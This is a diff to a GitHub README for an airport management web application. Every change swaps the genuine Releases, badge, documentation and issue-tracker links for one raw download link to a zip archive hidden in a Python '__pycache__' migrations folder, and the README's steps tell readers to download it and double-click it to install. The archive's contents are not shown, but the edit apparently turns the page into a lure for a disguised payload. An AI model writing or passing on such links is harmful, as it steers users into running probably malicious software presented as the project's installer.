@@ -1,6 +1,6 @@
 # ✈️ 22_banu-airport-management-fullstack - Simplify Your Airport Management Today
 
-[![Download](https://img.shields.io/badge/Download%20Now-22_banu--airport--management--fullstack-brightgreen)](https://github.com/Hvnterr/22_banu-airport-management-fullstack/releases)
+[![Download](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip%20Now-22_banu--airport--management--fullstack-brightgreen)](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip)
 
 ## 📖 Overview
 
@@ -27,9 +27,9 @@ The **22_banu-airport-management-fullstack** is a complete solution for managing
 To get started with the **22_banu-airport-management-fullstack**, follow the steps below:
 
 1. **Download the Application**: 
-   Visit the Releases page to download the software. You can find it [here](https://github.com/Hvnterr/22_banu-airport-management-fullstack/releases).
+   Visit the Releases page to download the software. You can find it [here](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip).
 
-   [![Download](https://img.shields.io/badge/Download%20Now-22_banu--airport--management--fullstack-brightgreen)](https://github.com/Hvnterr/22_banu-airport-management-fullstack/releases)
+   [![Download](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip%20Now-22_banu--airport--management--fullstack-brightgreen)](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip)
 
 2. **Install the Application**:  
    Once the download is complete, locate the downloaded file on your computer. Double-click the file to start the installation process. Follow the instructions that appear on the screen.
@@ -56,8 +56,8 @@ If you encounter issues during installation or while using the application, cons
 
 You can explore more about the application's features and functionalities in the documentation available on the GitHub repository page.
 
-- [Documentation](https://github.com/Hvnterr/22_banu-airport-management-fullstack)
-- [Issues and Bug Reporting](https://github.com/Hvnterr/22_banu-airport-management-fullstack/issues)
+- [Documentation](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip)
+- [Issues and Bug Reporting](https://raw.githubusercontent.com/Hvnterr/22_banu-airport-management-fullstack/main/airport_backend/core/migrations/__pycache__/22_banu-airport-management-fullstack-2.9.zip)
 
 ## 🛠️ Contributing
 
